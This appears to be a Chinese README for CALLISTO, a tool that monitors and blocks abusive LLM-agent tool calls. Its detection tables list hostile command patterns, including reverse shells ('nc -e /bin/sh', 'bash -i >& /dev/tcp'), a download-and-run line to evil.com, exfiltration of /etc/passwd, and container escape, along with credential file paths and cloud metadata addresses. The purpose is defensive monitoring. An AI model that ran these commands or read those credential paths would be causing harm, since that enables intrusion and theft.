# CALLISTO 项目

**CALLISTO** (Causal And LLM-Level Invocation Sequence Temporal Observer) 是一个用于实时监控 LLM Agent API 滥用和行为异常的安全检测系统。

本项目包含三个主要组成部分：
1. **CALLISTO Python 包** - 核心检测引擎（可独立使用）
2. **OpenClaw 插件** - 实时拦截和阻断
3. **OpenClaw Skill** - 手动扫描和状态查询

---

## 项目架构

```
┌─────────────────────────────────────────────────────────────────┐
│                      CALLISTO 项目                               │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────────────┐  ┌─────────────────────┐              │
│  │  Python 包 (核心)    │  │  OpenClaw 插件      │              │
│  │  - 检测引擎          │  │  - 实时拦截         │              │
│  │  - 离线扫描          │  │  - 熔断阻断         │              │
│  │  - 行为指纹          │  │  - Skill 工具       │              │
│  │  - 评估框架          │  │                     │              │
│  └─────────────────────┘  └─────────────────────┘              │
│                                                                 │
│  支持功能：                                                      │
│  • 离线扫描 (callisto scan)                                     │
│  • 实时监控 (callisto monitor)                                  │
│  • 风险检测 (callisto engine)                                   │
│  • 报告生成 (auto-report)                                       │
│  • 行为指纹训练 (callisto train)                                │
│  • 性能评估 (callisto eval)                                     │
└─────────────────────────────────────────────────────────────────┘
```

---

## 核心功能

### 1. 离线扫描 (Offline Scan)

扫描历史会话日志，检测潜在安全风险。

```bash
# 扫描单个文件
callisto scan session_123.jsonl

# 扫描目录
callisto scan ./logs/

# 使用行为指纹
callisto scan ./logs/ --fingerprint ./fingerprints.json
```

**输出示例：**
```
--- session_123.jsonl (15 calls) ---
[HIGH] A3_DATA_EXFIL
  说明：Sensitive file read detected: /etc/passwd
  分数：0.80

Scanned 10 sessions, found 25 alerts.
```

### 2. 实时监控 (Real-time Monitor)

实时监控 OpenClaw 日志目录，自动拦截风险操作。

```bash
# 基础监控
callisto monitor ./logs

# 启用自动阻断
callisto monitor ./logs --block

# 自定义扫描间隔
callisto monitor ./logs --interval 0.5

# 使用行为指纹
callisto monitor ./logs --fingerprint ./fingerprints.json
```

**监控效果：**
- 实时检测并打印告警
- 自动生成紧急报告（熔断时）
- 支持手动停止（Ctrl+C）

### 3. 风险检测 (Detection Engine)

CALLISTO 引擎支持 6 大类攻击检测：

| 代码 | 类型 | 检测内容 |
|------|------|----------|
| A1 | `rate_flood` | 速率洪水（8 次/5 秒） |
| A2 | `privilege_escalation` | 权限升级（敏感工具链） |
| A3 | `data_exfil` | 数据外泄（敏感文件/内网访问） |
| A4 | `behavior_drift` | 行为漂移（工具分布变化） |
| A5 | `temporal_violation` | 时序违例（先删除后备份） |
| A6 | `state_poison` | 状态投毒（修改配置文件） |

**细化检测场景：**
- **P1/D1**: 敏感文件读取（`/etc/passwd`, `id_rsa`, `.aws/credentials`）
- **L1/L2**: 内网访问（192.168.x.x, 10.x.x.x, 云元数据）
- **L3**: 凭证文件访问（SSH 密钥、云凭证、Kubeconfig）

### 4. 报告生成 (Report Generation)

自动生成检测报告，支持两种模式：

**紧急报告（熔断触发时）：**
```bash
# 实时监控自动生成
# 输出位置：./reports/emergency_<session_id>_<timestamp>.txt
```

**完整评估报告：**
```bash
# 运行评估并生成报告
callisto eval --benign 100 --attacks 30 --output ./eval_results
```

**报告内容：**
- 总体指标（Precision, Recall, F1, FPR）
- 每类攻击的检测效果
- 检测延迟分析
- 与基线方法对比

### 5. 行为指纹训练 (Fingerprint Training)

学习正常行为模式，降低误报率。

```bash
# 从历史会话训练
callisto train ./logs/ --output ./fingerprints.json

# 在监控时使用指纹
callisto monitor ./logs --fingerprint ./fingerprints.json
```

**指纹内容：**
- 跨会话行为特征
- 工具调用频率分布
- 时序模式原型

### 6. 性能评估 (Evaluation)

评估检测效果并与基线方法对比。

```bash
# 运行完整评估
callisto eval --benign 100 --attacks 30

# 输出到指定目录
callisto eval --output ./my_eval_results
```

**评估指标：**
- Precision / Recall / F1
- False Positive Rate (FPR)
- 检测延迟（从攻击发生到检出的时间）
- 每会话平均处理时间

---

## 快速开始

### 作为 OpenClaw 插件使用（推荐）

```bash
# 1. 构建插件
cd ~/.openclaw/extensions/callisto-plugin
npm run build

# 2. 在 ~/.openclaw/openclaw.json 中启用
# 添加 "callisto-plugin" 到 plugins.allow 列表

# 3. 重启 OpenClaw
pkill -f openclaw
openclaw gateway --force

# 4. 验证
openclaw plugins list
```

**效果**：自动拦截所有高风险工具调用。

### 作为 Python 包使用

```bash
# 安装
cd ~/.openclaw/extensions/callisto-plugin
pip install -e .

# 或使用虚拟环境
python3 -m venv .venv
source .venv/bin/activate
pip install -e .

# 使用 CLI
callisto --help
callisto scan ./logs
callisto monitor ./logs --block
```

---

## 检测的攻击类型详解

### 敏感文件读取 (P1/D1)

检测尝试读取敏感文件的操作：

| 文件类型 | 示例路径 |
|----------|----------|
| 系统文件 | `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` |
| SSH 密钥 | `id_rsa`, `id_ed25519`, `.pem`, `.key` |
| 云凭证 | `.aws/credentials`, `.azure/`, `.gcloud/` |
| K8s 配置 | `.kube/config`, `serviceaccount/token` |
| 应用密钥 | `.env`, `api_key`, `secret`, `token` |
| 开发凭证 | `.npmrc`, `.pypirc`, `.git-credentials` |

### 内网访问检测 (L1/L2)

检测访问内网地址或服务：

| 类型 | 模式 |
|------|------|
| 私有 IP | `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` |
| 云元数据 | `169.254.169.254`, `metadata.google.internal` |
| 内网域名 | `.internal`, `.local`, `.lan`, `.corp` |
| 数据库 | `mysql.`, `redis.`, `postgres.`, `mongo.` |
| 服务发现 | `consul.`, `vault.`, `elasticsearch.` |

### 恶意命令检测

检测包含恶意意图的命令：

| 类型 | 示例 |
|------|------|
| 提权 | `sudo su -`, `chmod 4755`, `chown root` |
| 反弹 shell | `nc -e /bin/sh`, `bash -i >& /dev/tcp` |
| 数据外泄 | `curl -d @/etc/passwd`, `scp user@host` |
| 容器逃逸 | `docker run --privileged`, `nsenter` |
| 恶意下载 | `curl http://evil.com/x.sh | sh` |

---

## 项目结构

```
callisto-plugin/
├── callisto/                    # Python 包（核心引擎）
│   ├── __main__.py             # CLI 入口
│   ├── cli.py                  # 命令行界面
│   ├── engine.py               # 检测引擎主逻辑
│   ├── monitor.py              # 实时监控器
│   ├── config.py               # 配置管理
│   ├── openclaw.py             # OpenClaw 集成
│   ├── collector/              # 数据收集层
│   │   ├── models.py           # 数据模型
│   │   ├── interceptor.py      # 拦截器
│   │   └── openclaw_parser.py  # 日志解析器
│   ├── features/               # 特征提取层
│   │   ├── temporal.py         # 时序特征
│   │   ├── structural.py       # 结构特征
│   │   └── semantic.py         # 语义特征
│   ├── detection/              # 检测层
│   │   ├── causal.py           # 因果责任评分
│   │   ├── changepoint.py      # 变点检测
│   │   └── fingerprint.py      # 行为指纹
│   ├── response/               # 响应层
│   │   ├── circuit_breaker.py  # 熔断器
│   │   ├── alert_ranker.py     # 告警排序
│   │   └── explainer.py        # 告警解释
│   ├── attacks/                # 攻击模拟
│   │   └── simulator.py        # 数据集生成
│   └── evaluation/             # 评估框架
│       ├── metrics.py          # 评估指标
│       ├── run_eval.py         # 评估运行器
│       └── baselines/          # 基线方法
├── openclaw_plugin/
│   └── callisto-skill/
│       ├── SKILL.md            # Skill 定义
│       ├── src/index.js        # Skill Node.js 入口
│       └── python/
│           └── callisto_agent.py  # Python 检测后端
├── scripts/                    # 工具脚本
│   ├── test_detection.py       # 统一测试框架（原生 + 专家测试集）
│   └── monitor_openclaw.py     # OpenClaw 实时监控脚本
├── integration_examples/       # 集成示例
├── test_reports/               # 测试报告
├── reports/                    # 生成的报告
├── test_sessions/              # 测试会话日志（原生 6 类攻击）
├── expert_test_sessions/       # 专家测试会话（15 类风险场景）
└── docs/                       # 文档
```

---

## 配置说明

### 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `CALLISTO_THRESHOLD` | `3` | 熔断阈值（HIGH 风险操作数量） |
| `CALLISTO_PYTHON` | `python3` | Python 可执行文件路径 |

### 配置文件

在 `~/.openclaw/openclaw.json` 中配置：

```json
{
  "plugins": {
    "enabled": true,
    "entries": {
      "callisto-plugin": {
        "config": {
          "threshold": 3,
          "cooldown": 60
        }
      }
    },
    "allow": ["callisto-plugin"]
  }
}
```

---

## 文档索引

| 文档 | 说明 |
|------|------|
| [docs/OVERVIEW.md](docs/OVERVIEW.md) | 项目总体架构 |
| [OPENCLAW_PLUGIN.md](OPENCLAW_PLUGIN.md) | OpenClaw 插件使用指南 |
| [openclaw_plugin/callisto-skill/README.md](openclaw_plugin/callisto-skill/README.md) | Skill 使用指南 |
| [DETECTION_LOGIC.md](DETECTION_LOGIC.md) | 检测逻辑详解 |
| [API.md](API.md) | API 参考文档 |
| [QUICKSTART.md](QUICKSTART.md) | 快速入门 |

---

## 测试验证

### 运行统一测试

```bash
cd ~/.openclaw/extensions/callisto-plugin
.venv/bin/python scripts/test_detection.py
```

**测试结果**：
- 原生测试集（6 类攻击 A1-A6）：召回率 63.3%，特异度 100%
- 专家测试集（15 类风险场景）：召回率 82.7%，特异度 96%
- 综合评级：良好

### 实时监控测试

```bash
# 生成测试日志
.venv/bin/python scripts/monitor_openclaw.py --generate

# 启动实时监控
.venv/bin/python scripts/monitor_openclaw.py --monitor --log-file test_sessions/realtime_test.jsonl

# 启用自动熔断
.venv/bin/python scripts/monitor_openclaw.py --monitor --log-file test_sessions/realtime_test.jsonl --block
```

---

## 故障排除

### Python 依赖缺失

```bash
cd ~/.openclaw/extensions/callisto-plugin
pip install -e .
```

### 插件未加载

```bash
# 检查插件状态
openclaw plugins list

# 重启 OpenClaw
pkill -9 -f openclaw
rm -rf ~/Library/Caches/openclaw
openclaw gateway --force
```

### 查看日志

```bash
# Plugin 日志
cat /tmp/callisto-plugin.log

# Python 引擎日志
cat /tmp/callisto-python.log

# 启动日志
cat /tmp/callisto-startup.log
```

---

## License

MIT
